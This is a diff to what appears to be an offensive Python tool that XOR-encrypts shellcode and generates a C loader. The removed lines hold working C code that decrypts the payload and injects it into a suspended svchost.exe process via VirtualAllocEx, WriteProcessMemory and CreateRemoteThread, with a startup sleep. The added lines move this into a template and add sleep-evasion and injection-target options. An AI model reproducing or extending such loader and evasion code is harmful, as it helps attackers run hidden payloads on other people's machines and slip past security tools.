@@ -4,6 +4,9 @@ import argparse
 import itertools
 import secrets
 
+from jinja2 import Template
+
+
 BANNER =  """.d8888b.  888               888 888 8888888b.  8888888b.   .d88888b.  8888888b.
 d88P  Y88b 888               888 888 888  "Y88b 888   Y88b d88P" "Y88b 888   Y88b
 Y88b.      888               888 888 888    888 888    888 888     888 888    888
@@ -58,69 +61,24 @@ def load_bin_file(filename):
         return f.read()
 
 
-def generate_code(shellcode, key):
+def load_template(filename):
+    with open(filename) as f:
+        return f.read()
+
+
+def generate_code(shellcode, key, config_options):
     """Generates the C++ code where the payload will be set."""
 
     # Calculates the actual length of the shellcode and the key.  There will always be 4 bytes received for every actual byte in the payload.
     shellcode_length = int(len(shellcode) / 4)
     key_length = int(len(key) / 4)
 
-    return f"""
-    #include <stdio.h>
-    #include <string.h>
-    #include <processthreadsapi.h>
-    #include <windows.h>
-    #include <conio.h>
-
-    const char shellcode[] = "{shellcode}";
-    const char key[] = "{key}";
-    char decoded_shellcode[{shellcode_length}];
-
-    char* decode() {{
-        for(int i = 0; i < {shellcode_length}; i++) {{
-            decoded_shellcode[i] = shellcode[i] ^ key[i % {key_length}];
-        }}
-
-        return decoded_shellcode;
-    }}
-
-    BOOL spawn_process() {{
-        STARTUPINFO si = {{0}};
-        PROCESS_INFORMATION pi = {{0}};
-
-        si.cb = sizeof(si);
-        BOOL creationResult = CreateProcess("C:\\\\Windows\\\\System32\\\\svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
-
-        if(creationResult == TRUE) {{
-            //printf("New PID: %d\\n", pi.dwProcessId);
-            //printf("Thread ID: %d\\n", pi.dwThreadId);
-
-            PVOID remoteBuff = VirtualAllocEx(pi.hProcess, NULL, {shellcode_length}, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-            WriteProcessMemory(pi.hProcess, remoteBuff, decoded_shellcode, {shellcode_length}, NULL);
-            HANDLE remoteThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuff, NULL, 0, NULL);
-
-            getch();
-
-            CloseHandle(pi.hProcess);
-        }}
-        else {{
-            printf("Error!");
-            exit(-1);
-        }}
-
-        return creationResult;
-    }}
-
-    int main() {{
-        Sleep(20000);
-        char* decoded_shellcode = decode();
-        spawn_process();
-        // For debugging purposes.
-        //printf("Decoded: '%s'\\n", decoded_shellcode);
-        //printf("Shellcode: %s\\n", shellcode);
-        return 0;
-    }}
-"""
+    template = Template(load_template("template.c"))
+    return template.render({"shellcode_length": shellcode_length,
+                            "key_length": key_length,
+                            "shellcode": shellcode,
+                            "key": key,
+                            "options": config_options})
 
 
 def generate_random_key(length):
@@ -152,6 +110,9 @@ def main():
     source_group = parser.add_mutually_exclusive_group()
     source_group.add_argument('-sf', '--source-bin-file', help="Source file from which the shellcode should be loaded.  This is expected to be a raw file.")
     source_group.add_argument('-ss', '--source-hex-string', help="Hex string from which the payload should be provisioned. Ex: \\x90\\x65\\x23...")
+
+    parser.add_argument('--sleep-evasion', default=0, type=int, help="Sleeps for x seconds when the program is initially launched.")
+    parser.add_argument('--remote-inject-executable', default="C:\\Windows\\System32\\svchost.exe", help="If injecting in a remote process, this indicates the process to inject the shellcode into.")
 
     args = parser.parse_args()
 
@@ -194,8 +155,16 @@ def main():
         print("Encrypted shellcode:")
         print(hex_encrypted_shellcode)
 
+    code_config = {}
+
+    if args.sleep_evasion > 0:
+        code_config["sleep_evasion"] = args.sleep_evasion
+
+    if args.remote_inject_executable:
+        code_config["remote_inject_executable"] = args.remote_inject_executable
+
     # Generates the C++ code.
-    generated_code = generate_code(hex_encrypted_shellcode, hex_key)
+    generated_code = generate_code(hex_encrypted_shellcode, hex_key, code_config)
 
     # Creates our file names.
     c_file = "{}.c".format(args.output_file)
